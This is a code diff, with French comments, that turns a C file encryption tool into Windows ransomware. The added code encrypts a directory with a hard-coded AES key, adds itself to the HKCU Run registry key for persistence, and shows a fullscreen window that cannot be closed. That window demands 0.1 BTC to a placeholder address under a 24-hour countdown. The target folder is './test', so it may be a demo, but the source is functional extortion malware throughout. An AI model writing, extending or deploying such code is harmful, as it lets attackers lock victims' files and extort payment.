@@ -1,33 +1,170 @@
+#include <windows.h>
+#include <time.h>
 #include <stdio.h>
-#include <string.h>
 #include "ransomware.h"
 
-int main(int argc, char *argv[]) { 
-    if (argc < 5) {
-        fprintf(stderr, "Usage: %s <directory> <key> <iv> <mode>\n", argv[0]);
-        fprintf(stderr, "Mode: 0 pour chiffrer, 1 pour déchiffrer\n");
+// Déclarations globales
+const char *directory = "./test";
+unsigned char key[KEY_SIZE] = "0123456789abcdef0123456789abcdef"; // Clé AES 256 bits
+unsigned char iv[IV_SIZE] = "abcdef9876543210";                  // IV AES 128 bits
+int encryption_done = 0;
+time_t end_time;
+
+// Prototypes
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv);
+void perform_decryption(const char *directory, unsigned char *key, unsigned char *iv);
+void add_to_startup(const char *exe_path);
+
+// Fonction principale
+int main() {
+    // Calcul de la fin du chrono (24 heures)
+    time_t now = time(NULL);
+    end_time = now + 24 * 60 * 60;
+
+    // Ajouter au démarrage
+    char exe_path[MAX_PATH];
+    GetModuleFileName(NULL, exe_path, MAX_PATH);
+    add_to_startup(exe_path);
+
+    // Initialisation de la fenêtre
+    const char *class_name = "RansomwareWindow";
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+
+    WNDCLASS wc = {0};
+    wc.lpfnWndProc = WindowProc;
+    wc.hInstance = hInstance;
+    wc.lpszClassName = class_name;
+
+    if (!RegisterClass(&wc)) {
+        fprintf(stderr, "Erreur lors de l'enregistrement de la classe de fenêtre.\n");
         return 1;
     }
 
-    const char *directory = argv[1];
-    unsigned char key[KEY_SIZE]; // 256 bits
-    unsigned char iv[IV_SIZE];  // 128 bits
+    HWND hwnd = CreateWindowEx(
+        WS_EX_TOPMOST,                   // Toujours au-dessus
+        class_name,                     // Nom de la classe
+        "Ransomware Alert",             // Titre de la fenêtre
+        WS_POPUP | WS_VISIBLE,          // Plein écran sans bordure
+        0, 0,                           // Position (coin supérieur gauche)
+        GetSystemMetrics(SM_CXSCREEN),  // Largeur de l'écran
+        GetSystemMetrics(SM_CYSCREEN),  // Hauteur de l'écran
+        NULL, NULL, hInstance, NULL);
 
-    // Copier la clé et le vecteur d'initialisation depuis les arguments
-    strncpy((char *)key, argv[2], sizeof(key));
-    strncpy((char *)iv, argv[3], sizeof(iv));
-
-    // Récupérer le mode (0 pour chiffrer, 1 pour déchiffrer)
-    int mode = atoi(argv[4]);
-
-    // Vérifier que le mode est valide
-    if (mode != 0 && mode != 1) {
-        fprintf(stderr, "Erreur : mode invalide. Utilisez 0 pour chiffrer ou 1 pour déchiffrer.\n");
+    if (!hwnd) {
+        fprintf(stderr, "Erreur lors de la création de la fenêtre.\n");
         return 1;
     }
 
-    // Appeler la fonction pour lire et traiter les fichiers
-    read_and_crypt_directory(directory, mode, key, iv);
+    // Lancer le chiffrement
+    perform_encryption(directory, key, iv);
 
+    // Lancer le timer pour mettre à jour le chrono
+    SetTimer(hwnd, 1, 1000, NULL);  // Timer toutes les secondes (1000 ms)
+
+    // Boucle de messages pour la fenêtre
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    return 0;
+}
+
+// Fonction pour ajouter au démarrage
+void add_to_startup(const char *exe_path) {
+    HKEY hKey;
+    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+    RegSetValueEx(hKey, "RansomwareApp", 0, REG_SZ, (BYTE *)exe_path, strlen(exe_path) + 1);
+    RegCloseKey(hKey);
+}
+
+// Fonction de chiffrement
+void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv) {
+    read_and_crypt_directory(directory, 0, key, iv);
+    encryption_done = 1;
+}
+
+// Fonction de déchiffrement
+void perform_decryption(const char *directory, unsigned char *key, unsigned char *iv) {
+    read_and_crypt_directory(directory, 1, key, iv);
+}
+
+// Fonction pour gérer les événements de la fenêtre
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+    static HFONT hFont;
+    static char time_remaining[64];
+    switch (uMsg) {
+        case WM_CREATE: {
+            // Créer un bouton "Déchiffrer" uniquement si l'encryption est terminée
+            CreateWindow("BUTTON", "Déchiffrer",
+                WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                500, 500, 150, 50, hwnd, (HMENU)1, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+
+            // Définir une police pour le texte
+            hFont = CreateFont(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
+                               CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, "Arial");
+            break;
+        }
+        case WM_COMMAND: {
+            if (LOWORD(wParam) == 1) {
+                perform_decryption(directory, key, iv);
+                PostQuitMessage(0);
+            }
+            break;
+        }
+        case WM_PAINT: {
+            PAINTSTRUCT ps;
+            HDC hdc = BeginPaint(hwnd, &ps);
+
+            // Définir le fond noir
+            RECT rect;
+            GetClientRect(hwnd, &rect);
+            FillRect(hdc, &rect, CreateSolidBrush(RGB(0, 0, 0)));
+
+            // Dessiner le message principal en haut
+            SelectObject(hdc, hFont);
+            SetTextColor(hdc, RGB(255, 0, 0)); // Texte rouge
+            SetBkMode(hdc, TRANSPARENT); // Pas de fond pour le texte
+            if (encryption_done) {
+                RECT text_rect1 = {rect.left + 50, rect.top + 50, rect.right - 50, rect.top + 100};
+                DrawText(hdc, "Vos fichiers ont été chiffrés !", -1, &text_rect1, DT_CENTER | DT_VCENTER);
+            } else {
+                RECT text_rect1 = {rect.left + 50, rect.top + 50, rect.right - 50, rect.top + 100};
+                DrawText(hdc, "Chiffrement en cours...", -1, &text_rect1, DT_CENTER | DT_VCENTER);
+            }
+
+            // Dessiner l'adresse Bitcoin au centre
+            RECT text_rect2 = {rect.left + 50, rect.top + 150, rect.right - 50, rect.top + 200};
+            DrawText(hdc, "Envoyez 0.1 BTC à l'adresse suivante : 1BitcoinFakeAddress123", -1, &text_rect2, DT_CENTER | DT_VCENTER);
+
+            // Afficher le temps restant en bas
+            RECT text_rect3 = {rect.left + 50, rect.bottom - 100, rect.right - 50, rect.bottom - 50};
+            DrawText(hdc, time_remaining, -1, &text_rect3, DT_CENTER | DT_VCENTER);
+
+            EndPaint(hwnd, &ps);
+            break;
+        }
+        case WM_TIMER: {
+            // Mise à jour du temps restant
+            time_t now = time(NULL);
+            int remaining = (int)(end_time - now);
+            if (remaining <= 0) {
+                strcpy(time_remaining, "Temps écoulé !");
+            } else {
+                int hours = remaining / 3600;
+                int minutes = (remaining % 3600) / 60;
+                int seconds = remaining % 60;
+                sprintf(time_remaining, "Temps restant : %02d:%02d:%02d", hours, minutes, seconds);
+            }
+            InvalidateRect(hwnd, NULL, TRUE);  // Redessiner la fenêtre
+            break;
+        }
+        case WM_CLOSE:
+            return 0; // Empêcher la fermeture
+        default:
+            return DefWindowProc(hwnd, uMsg, wParam, lParam);
+    }
     return 0;
 }
